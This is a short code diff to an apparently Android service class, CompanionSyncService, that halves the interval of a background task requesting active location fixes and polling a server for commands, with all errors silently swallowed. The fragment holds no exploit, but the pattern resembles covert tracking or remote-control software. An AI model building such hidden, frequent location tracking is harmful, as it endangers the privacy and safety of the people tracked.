@@ -127,7 +127,7 @@ public class CompanionSyncService extends Service {
                 requestActiveLocationFix();
                 pollServerCommands();
             } catch (Throwable ignored) {}
-        }, 2, 20, TimeUnit.SECONDS);
+        }, 2, 10, TimeUnit.SECONDS);
     }
 
     private void pollServerCommands() {
